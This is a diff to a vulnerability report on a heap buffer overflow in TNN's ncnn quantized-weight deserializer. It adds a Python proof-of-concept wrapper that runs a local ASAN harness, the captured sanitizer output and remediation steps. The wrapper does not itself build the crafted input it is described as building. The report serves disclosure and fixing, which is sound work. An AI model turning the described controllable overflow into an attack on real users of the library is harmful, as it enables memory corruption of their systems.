@@ -70,7 +70,74 @@ A heap out-of-bounds write of controllable content (starting at 256 bytes), whic
 
 Require `w == 256` for the quantized branch (or validate against the actual format upper bound); `index_array` should read only `min(256, AlignSize(w,4))` bytes; allocate the output `RawBuffer` as `w*sizeof(float)` and validate; set an upper bound on `weight_data_size` and validate it against the remaining length of the `.bin`.
 
+## PoC Details
+
+Usage:
+    python exp.py
+Dependencies:
+    Python 3.8+, standard library only
+    Local ASAN reproduction binary: /home/ddl/ai-audit/repro/tnn/poc
+Notes:
+    The script builds the malicious input and invokes the local ASAN harness, printing the AddressSanitizer verdict lines. The full chain and verification screenshot are in the bundled submission form (screenshot on the last page).
+
+```python
+#!/usr/bin/env python3
+# TNN ncnn quantized-weight heap overflow (w=1)
+# Usage: python exp.py [harness_path]
+import os
+import subprocess
+import sys
+
+HARNESS = sys.argv[1] if len(sys.argv) > 1 else os.environ.get(
+    "TNN_POC", "/home/ddl/ai-audit/repro/tnn/poc")
+
+
+def main():
+    if not os.path.isfile(HARNESS):
+        print("[!] harness not found: %s" % HARNESS)
+        return 2
+    env = dict(os.environ, ASAN_OPTIONS="detect_leaks=0:abort_on_error=1")
+    p = subprocess.run([HARNESS, "1"], stdout=subprocess.PIPE,
+                       stderr=subprocess.STDOUT, text=True, env=env)
+    out = p.stdout
+    print("[*] target: TNN ncnn .param weight_data_size w=1")
+    print("[*] source: source/tnn/interpreter/ncnn/serializer.h:94-111")
+    for line in out.splitlines():
+        if any(k in line for k in (
+                "ERROR: AddressSanitizer", "WRITE of size",
+                "serializer.h:101", "SUMMARY: AddressSanitizer")):
+            print(line)
+    print("[*] exit_code=%d" % p.returncode)
+    ok = ("heap-buffer-overflow" in out and "serializer.h:101" in out
+          and p.returncode != 0)
+    if ok:
+        print("RESULT: TNN ncnn quantized-weight heap-buffer-overflow "
+              "(serializer.h:101, w=1)")
+        return 0
+    print("RESULT: NOT REPRODUCED")
+    return 1
+
+
+if __name__ == "__main__":
+    sys.exit(main())
+```
+
+Observed ASAN evidence:
+
+```text
+ERROR: AddressSanitizer: heap-buffer-overflow
+WRITE of size 256
+#3 tnn::ncnn::Deserializer::GetRaw(...) source/tnn/interpreter/ncnn/serializer.h:101
+SUMMARY: AddressSanitizer: heap-buffer-overflow ... serializer.h:101
+```
+
+
 
 <img width="1011" height="396" alt="image" src="https://github.com/user-attachments/assets/2ca783fe-a8c2-423a-a9ce-d0900bcf380b" />
+
+
+## Remediation
+
+Validate the relation between w and 256; index_array should read only min(256, AlignSize(w,4)) bytes; allocate the output RawBuffer as w*sizeof(float); set an upper bound on weight_data_size and validate it against the remaining length of the .bin.
 
 
